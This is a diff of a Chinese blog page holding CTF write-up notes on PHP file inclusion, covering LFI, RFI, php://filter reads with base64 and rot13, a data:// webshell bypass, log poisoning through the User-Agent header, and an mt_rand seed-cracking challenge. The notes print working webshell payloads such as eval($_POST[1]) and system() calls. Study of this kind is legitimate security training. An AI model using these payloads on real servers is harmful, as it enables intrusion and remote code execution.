@@ -465,14 +465,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -525,7 +525,7 @@
 <li>看吧，成功了，这就是简单的本地文件包含，但如果将1.txt 内的内容换成一句换木马，再用菜刀连接一下，那是不是就可以获取shell了，这里小编就不演示了，留给你们慢慢琢磨。。。。。。</li>
 </ol>
 <h2 id="远程文件包含，RFI，remote-file-inclusion"><a href="#远程文件包含，RFI，remote-file-inclusion" class="headerlink" title="远程文件包含，RFI，remote file inclusion"></a>远程文件包含，RFI，remote file inclusion</h2><ol>
-<li>远程文件包含许哟啊对php.ini进行一些配置</li>
+<li>远程文件包含需要对php.ini进行一些配置</li>
 <li>即allow_url_fopen和allow_url_include要为ON，即和伪协议的使用条件相同</li>
 <li>设置成功后记得要保存并且重新启动一下</li>
 <li>好了现在可以开始演示远程包含了，其实和文件包含相差无几，只是把包含的换成外网链接一下就好了<br><img src="https://img-blog.csdnimg.cn/20181110112156499.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"></li>
@@ -537,7 +537,7 @@
 <h3 id="csdn中的一道例题"><a href="#csdn中的一道例题" class="headerlink" title="csdn中的一道例题"></a>csdn中的一道例题</h3><ol>
 <li><a target="_blank" rel="noopener" href="http://vulnerable/fileincl/example1.php?page=intro.php%EF%BC%88%E8%AF%A5php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">http://vulnerable/fileincl/example1.php?page=intro.php（该php文件包含LFI本地文件上传漏洞</a>)</li>
 <li>但是没有地方可以upload你的webshell后门代码</li>
-<li>LFI只能读取到非php文件的源码，因为php文件会被直接执行，没有办法查看到源码</li>
+<li>LFI只能读取到非php文件的源码，因为php文件会被直接执行，没有办法查看到源码（但是如果可以以base64加密，则可以不去读取php的源码）</li>
 <li>如果你能读取到config.php之类的文件，或许可以拿到数据库账号远程登录数据库入侵进去</li>
 <li>现在的问题是：LFI如何读取到php文件的源码</li>
 <li>演示：如果正常用LFI去读/sqli/db.php文件，是无法读取到它的源码的，只会被当作php文件被执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnerable&#x2F;fileincl&#x2F;example1.php?page&#x3D;..&#x2F;sqli&#x2F;db.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -554,12 +554,13 @@
 <li>发现对php有过滤，使用str_replace进行替换<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723135932.png"></li>
 <li>使用php://filter伪协议查看flag.php的代码发现flag.php被替换为flag.???,被过滤并且不能查看到源代码<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723140046.png"></li>
-<li>伪代码又不止一个，可以使用data://text/plain,伪协议绕过</li>
+<li>伪协议又不止一个，可以使用data://text/plain,伪协议绕过</li>
 <li>因为过滤了’php’字样，所以使用短标签<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>使用data://text/plain伪协议的同时，post值<pre class="line-numbers language-none"><code class="language-none">1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>即可查看到flag</li>
+<li>这个题的思路和逃逸很类似，将变量1逃逸出去，和命令执行中?c=include%0a$_GET[1]?&gt;&amp;1=system(‘ls’);一样</li>
 </ol>
-<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><h4 id="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"><a href="#日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限" class="headerlink" title="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"></a>日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限</h4><ol>
+<h3 id="web80tong"><a href="#web80tong" class="headerlink" title="web80tong"></a>web80tong</h3><h4 id="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"><a href="#日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限" class="headerlink" title="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"></a>日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限</h4><ol>
 <li>nginx日志文件路径：?file=/var/log/nginx/access.log</li>
 <li>apache2日志文件路径:?file=/var/log/apache2/access.log</li>
 <li>直接访问会显示User-Agent的信息<br><img src="https://img-blog.csdnimg.cn/20210227204642790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDg2MjE4,size_16,color_FFFFFF,t_70"></li>
@@ -574,6 +575,71 @@
 <li>因为是加的http header，所以原题对传入的file值不会产生过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728151332.png"></li>
 <li>User-Agent中写post传参，传入一个变量，将变量的值设为木马，和逃逸很相似<pre class="line-numbers language-none"><code class="language-none">User-Agent:&lt;?php eval($_POST[1]);?&gt;
 1&#x3D;system(&quot;ls .&#x2F;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="NewStarCTF-web2-includeOne"><a href="#NewStarCTF-web2-includeOne" class="headerlink" title="NewStarCTF web2 includeOne"></a>NewStarCTF web2 includeOne</h2><ol>
+<li>```php  <?php
+  highlight_file(__FILE__);
+  error_reporting(0);
+  include("seed.php");
+  //mt_srand(*********);
+  echo "Hint: ".mt_rand()."<br>";
+  if(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){
+      if(!preg_match("/base|\.\./i",$_GET['file']) && preg_match("/NewStar/i",$_GET['file']) && isset($_GET['file'])){
+          //flag in `flag.php`
+          include($_GET['file']);
+      }else{
+          echo "Baby Hacker?";
+      }
+  }else{
+      echo "No Hacker!";
+  } Hint: 1219893521
+  No Hacker!
+  <pre class="line-numbers language-none"><code class="language-none">
+2.   这个题的考点就是mt_rand()函数
+
+3.   这题是伪随机数的种子爆破，跟枯燥的抽奖那题类似，就是mt_rand()生成随机整数的时，会先进行种子的播种，当种子一样，接下来的数值根据次数也是可预测的，题目过滤了base，并且要有NewStar，可以使用rot进行文件包含。
+
+4.   mt_rand()函数每使用一次，就会对当前的seed进行播种，然后伪随机数加密,**但是一定要看好是给出的结果是第几次加密得到的**
+
+#### mt_rand()函数实例
+
+1.   ![img](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;7ea36b40cf8c442c9117260a391230c5.png)
+
+2.   ![img](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;18f1fe0c9c32495e93179e99cf11e93c.png)
+
+3.   爆出了种子为1145146，接下来使用相同的种子进行两次mt_rand()即可得到相同的数值，得到1202031004
+
+4.   ![img](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;7049f562ab34453e8173b0f06d819bf0.png)
+
+5.   ![img](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;7049f562ab34453e8173b0f06d819bf0.png)
+
+6.   最后进行rot13解密即可
+
+7.   &#96;&#96;&#96;php
+     s &#x3D; &quot;synt&#123;sor00r4p-63rq-47q0-o8rr-610s58s76n4n&#125;&quot;
+     
+     i &#x3D; 13
+     result &#x3D; &quot;&quot;
+     for c in s:
+         oc &#x3D; ord(c)
+         if 65 &lt;&#x3D; oc &lt;&#x3D; 90:
+             result +&#x3D; chr(((oc + i) - 65) % 26 + 65)
+         elif 97 &lt;&#x3D; oc &lt;&#x3D; 122:
+             result +&#x3D; chr(((oc + i) - 97) % 26 + 97)
+         else:
+             result +&#x3D; c
+     print(result)
+     &#x2F;&#x2F;这时我贴的脚本，我建议使用cyberchef和CTF在线工具等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h4 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h4><ol>
+<li>  rot13是一种字符处理方式，字符右移13位</li>
+<li>  当preg_match过滤了base时，可以在使用php://filter伪协议的同时使用rot13,而不是使用base64</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006202922.png"></li>
+<li>  在 <strong>filter/</strong> 和 <strong>/read</strong> 之间，我们可以添加任意的字符，当preg_match需要的时候</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006203159.png"></li>
+<li>  查看源代码，我们可以看到rot13编码得到的flag</li>
+<li>  使用凯撒加密解码的方式，我们可以得到flag</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006203327.png"></li>
 </ol>
 
                 
@@ -1097,7 +1163,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">108.8k</span>&nbsp;字
+                class="white-color">132.1k</span>&nbsp;字
             
             
             
